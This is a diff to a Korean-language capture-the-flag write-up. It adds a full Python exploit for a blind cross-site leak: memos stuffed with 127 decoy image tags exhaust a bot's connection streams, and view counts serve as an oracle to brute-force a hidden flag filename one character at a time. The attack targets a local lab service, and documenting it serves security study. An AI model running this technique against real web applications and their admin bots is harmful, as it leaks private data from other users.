@@ -123,6 +123,7 @@ async incrementViews(@Param('id') id: string): Promise<ResponseDto> {
 4. 봇이 해당 페이지에 접속하면 127개의 스트림은 막히지만, 타겟 이미지의 시작 글자가 실제 플래그와 일치할 경우 서버가 이미지를 반환하고 **스트림 1개를 정상적으로 종료(반환)**해 준다.
 5. 비어있는 1개의 스트림 통로를 통해 대기 중이던 조회수 증가 API(POST /view)가 서버로 성공적으로 전송된다.
 6. 조회수가 1 증가한 것을 확인하면, 입력한 시작 글자가 플래그의 올바른 일부임을 확신할 수 있다.
+7. 모든 값을 알아내면 /api/image?filename=flag_{추측한글자} 로 접근하면 flag를 얻을 수 있다.
 
 
 
@@ -185,3 +186,197 @@ __Step 11.__ bot을 통한 공유 메모 접근
 __Step 12.__ 요청 마다 view가 오르는 것을 확인 
 <img width="1211" height="476" alt="image" src="https://github.com/user-attachments/assets/37cfa912-6b7c-4344-af02-8569c58d7b3e" />
 
+## exploit Code
+```
+#[기본 세팅 (로그인)]
+#[이진 탐색 루프 시작]
+#[페이로드 생성]
+#[메모 게시] 
+#[공유 키 발급] 
+#[봇 호출 및 대기] 
+#[조회수 확인] 
+#[참/거짓 판단 후 다음 글자 추측]
+import requests
+import random
+import string
+import urllib3 # 추가
+import time
+
+# 쓸데없는 SSL 경고 메시지(InsecureRequestWarning)가 화면을 덮는 것을 방지
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+class MemoClient:
+    def __init__(self, base_url:str):
+        self.base_url = base_url
+        #Session 객체: 로그인 후 발급되는 쿠키(세션)을 자동으로 기억해줌
+        self.session = requests.Session()
+        self.session.verify = False
+        
+    def _generate_random_id(self, length=8):
+        # 매번 새로운 계정으로 가입을 하기 위한 랜덤 아이디 생성기
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    
+    def register_and_login(self) -> bool:
+        #랜덤 계정으로 회원가입 후 즉시 로그인 수행
+        username = self._generate_random_id()
+        password = "password123!"
+        
+        # 1. 회원가입 로직
+        register_url = f"{self.base_url}/api/auth/register"
+        print(f"[*] 랜덤 계정 생성 및 회원가입 시도: {username}")
+        
+        reg_res = self.session.post(register_url, json={"username":username, "password":password, "name":"x"})
+        
+        if reg_res.status_code not in [200,201]:
+            print(f"[-] 회원가입 실패")
+            return False
+        
+        # 2. 로그인 로직
+        login_url = f"{self.base_url}/api/auth/login"
+        print("[*] 로그인 시도 중...")
+        
+        login_res = self.session.post(login_url, json={"username":username, "password":password})
+        
+        if login_res.status_code == 200 or login_res.status_code == 201:
+            print("[+] 로그인 성공 세션 저장")
+            return True
+        else:
+            print(f"[-] 로그인 실패: {login_res.text}")
+            return False
+            
+            
+    def create_memo(self, title:str, content) -> str:
+        #메모 작성 메모ID 반환
+        url = f"{self.base_url}/api/memo"
+        res = self.session.post(url, json = {"title":title, "content":content})
+        
+        # 서버 응답 json 구조에 맞게 파싱
+        if res.status_code not in [200, 201]:
+            print("[-] 메모 작성 실패")
+            return None
+        
+        list_res = self.session.get(url)
+        data_list = list_res.json().get("data",[])
+        
+        latest_memo = data_list[-1]
+        memo_id = latest_memo.get("_id")
+        return memo_id
+        
+    def share_memo(self, memo_id: str) -> str:
+        # 메모를 공유상태로 만들고 sharedKey를 반환
+        url = f"{self.base_url}/api/memo/{memo_id}/share"
+        res = self.session.post(url)
+        return res.json().get("data",{}).get("sharedKey")
+        
+    def get_view(self) -> int:
+        # 메모 목록을 불러와 가장 최근 메모의 조회수 확인
+        url = f"{self.base_url}/api/memo"
+        res = self.session.get(url)
+        
+        # data 배열안에 메모들이 있다.
+        data_list = res.json().get("data", [])# 해석 필요
+        if not data_list:
+            return 0
+            
+        latest_memo = data_list[0]
+        #print(data_list)
+        print(f"[*] latest_memo value: {latest_memo.get('views', 0)}")
+        return latest_memo.get("views", 0)
+
+
+
+
+class BotClient:
+    def __init__(self, bot_url:str):
+        self.bot_url = bot_url
+        self.session = requests.Session()
+        
+    def report(self, target_url:str):
+        #봇에게 악성 URL을 전달하여 방문을 유도
+        print(f"[*] 봇에게 URL 신고중: {target_url}")
+        res = self.session.post(f"{self.bot_url}/report", json={"url": target_url})
+        
+        if res.status_code == 200:
+            print("[+] 봇이 정상적으로 URL 접수")
+        else:
+            print("[-] 봇 호출 실패!")
+
+
+def build_payload(guess_str: str) -> str:
+    """127개의 가짜 이미지와 1개의 타겟 이미지를 섞어 128개의 스트림을 꽉 채우는 페이로드 생성"""
+    payload = ""
+    # 127개의 함정 (무한 대기 유발)
+    for i in range(127):
+        payload += f"<img src='/api/image?filename=miss_{i}'>"
+        
+    # 1개의 진짜 타겟 (추측할 글자 포함)
+    payload += f"<img src='/api/image/admin?filename={guess_str}'>"
+    print("guess_str",guess_str)
+    return payload
+
+
+# 테스트
+if __name__ == "__main__":
+    TARGET_URL = "https://127.0.0.1"
+    BOT_URL = "http://127.0.0.1:5000"
+    
+    memo_client = MemoClient(TARGET_URL)
+    bot_client = BotClient(BOT_URL)
+    
+    print("===============================================")
+    print(" Blind XS-Leak Exploit (Stream Exhaustion)")
+    print("===============================================")
+    
+    
+    
+    # 우리가 찾아야 할 글자 후보군 (16진수 해시+ 혹시모를 하이픈)
+    CHARSET = "0123456789abcdef-_"
+    
+    #현재까지 확정된 정답
+    known_flag = "flag_"
+    
+    print(f"[*] 타겟 추출 시작! 기본 접두사: {known_flag}")
+    
+    #플래그를 모두 찾을 때까지 무한 반복(글자를 하나씩 이어 붙임)
+    while True:
+        found_next_char = False
+        if not memo_client.register_and_login():
+            print("[-] 로그인 실패하여 익스플로잇 종료")
+            exit(1)
+        for char in CHARSET:
+            guess = known_flag + char
+            print(f"[*] 테스트 중: [ {guess} ] ...", end="", flush=True)
+            
+            # 1. 페이로드 조립 및 메모 작성
+            payload = build_payload(guess)
+            memo_id = memo_client.create_memo(f"Leak {guess}",payload)
+            
+            # 2. 공유 키 발급
+            shared_key = memo_client.share_memo(memo_id)
+            print(memo_id, shared_key)
+            # 3. 봇에게 신고
+            bot_target_url = f"https://nginx/memo/shared?key={shared_key}"
+            bot_client.report(bot_target_url)
+            
+            # 4. 봇이 줄을때까지 대기
+            time.sleep(4)
+            
+            # 5. 참/거짓 판독(Oracle)
+            views = memo_client.get_view()
+            
+            if views > 0:
+                print(f"[+] 조회수 증가! 다음글자는  {char} 입니다!")
+                known_flag += char
+                found_next_char = True
+                break
+            else:
+                print("[MISS]")
+                
+            # 한사이클(CHARSET) 다 돌았는데 일치하는 글자가 없다면 끝난것!
+        if not found_next_char:
+            print("더이상 일치하는 글자가 없습니다.")
+            break
+    print("==================================================")
+    print(f"최종 획득한 타겟 파일명: {known_flag}")
+    print("==================================================")
+    print(f"[!] 이제 브라우저에서 https://127.0.0.1/api/image/admin?filename={known_flag}.png 로 접속하세요!")
+```
